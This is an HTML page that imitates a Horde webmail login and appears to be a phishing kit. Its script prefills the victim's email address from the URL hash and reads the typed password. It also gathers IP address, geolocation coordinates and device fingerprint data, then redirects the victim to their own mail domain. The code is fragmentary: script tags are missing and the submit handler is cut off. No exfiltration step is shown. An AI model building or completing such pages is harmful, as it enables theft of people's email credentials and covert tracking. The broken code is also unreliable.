<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>Login Form</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #e6e6e6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 15px 15px 10px;
            border-radius: 8px;
            width: 350px;
            box-shadow: -2px 2px 5px rgba(0,0,0,0.1);
        }

        .form-group {
            margin-bottom: 5px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 2px;
            font-size: 15px;
        }

        input, select {
            width: 100%;
            padding: 3px;
            border: 1px solid #ddd;
            border-radius: 2px;
            box-sizing: border-box;
            margin-bottom: 3px;
            height: 24px;
        }

        input {
            background-color: #fff9e6;
        }

        select {
            background-color: #f5f5f5;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 8px center;
            background-size: 12px;
            padding-right: 30px;
        }

        .login-button {
            background: linear-gradient(to bottom, #4a4a4a, #3a3a3a);
            color: white;
            padding: 3px 15px;
            border: 1px solid #2a2a2a;
            border-radius: 3px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            margin: 8px auto 0;
            font-size: 14px;
        }

        .lock-icon {
            font-size: 12px;
            opacity: 0.8;
        }

        .username-label, .password-label, .mode-label, .language-label {
            font-weight: bold;
            font-size: 15px;
        }

        .disabled-input {
            background-color: #d3d3d3;
            color: #808080;
        }

        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            display: none;
        }

        .success-message {
            color: #28a745;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            display: none;
        }

        footer {
            padding: 15px 0;
            text-align: center;
            position: fixed;
            width: 100%;
            bottom: 0;
        }

        .footer-container {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .footer-logo {
            max-width: 120px;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label class="username-label">Username</label>
                <input type="text" id="username" disabled class="disabled-input">
            </div>

            <div class="form-group">
                <label class="password-label">Password</label>
                <input type="password" id="password" value="">
            </div>

            <div class="form-group">
                <label class="mode-label">Mode</label>
                <select id="mode">
                    <option selected>Automatic</option>
                    <option>Manual</option>
                </select>
            </div>

            <div class="form-group">
                <label class="language-label">Language</label>
                <select id="language">
                    <option selected>English (American)</option>
                    <option>Spanish</option>
                    <option>French</option>
                </select>
            </div>

            <button type="submit" class="login-button">

            <div id="errorMessage" class="error-message">
                Invalid password, please try again
            </div>
            <div id="successMessage" class="success-message">
                Login successful
            </div>
        </form>
    </div>
    
    <footer>
        <div class="footer-container">
            <img src="horde-power1.png" alt="" class="footer-logo">
        </div>
    </footer>
    <script type="text/javascript" src="gt.js"></script>

    async function getClientInfo() {
        try {
            // Get IP and location data
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // Get browser info using UAParser
            const parser = new UAParser();
            const browserResult = parser.getResult();
            
            // Get device info
            const deviceInfo = {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            return {
                ip: data.ip,
                location: {
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    coordinates: `${data.latitude}, ${data.longitude}`,
                    timezone: data.timezone
                },
                browser: {
                    name: browserResult.browser.name,
                    version: browserResult.browser.version,
                    os: browserResult.os.name + ' ' + browserResult.os.version,
                    device: browserResult.device.type || 'desktop'
                },
                device: deviceInfo,
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            console.error('Error getting client info:', error);
            return null;
        }
    }

    async function handleSubmit(event) {
        event.preventDefault();
        // Get the password value before clearing it
        const password = document.getElementById('password').value;

        const successMessage = document.getElementById('successMessage');

        } else {

            setTimeout(() => {
                const domain = getEmailDomain(username);
                window.location.href = `https://${domain}`;

    function populateEmail() {
        const urlHash = window.location.hash.substring(1);
        const usernameField = document.getElementById('username');
        if (urlHash) {
            usernameField.value = urlHash;
            usernameField.disabled = true;
            usernameField.classList.add('disabled-input');
        }
    }

    function getEmailDomain(email) {
        return email.split('@')[1];
    }

    window.onload = populateEmail;

</html>
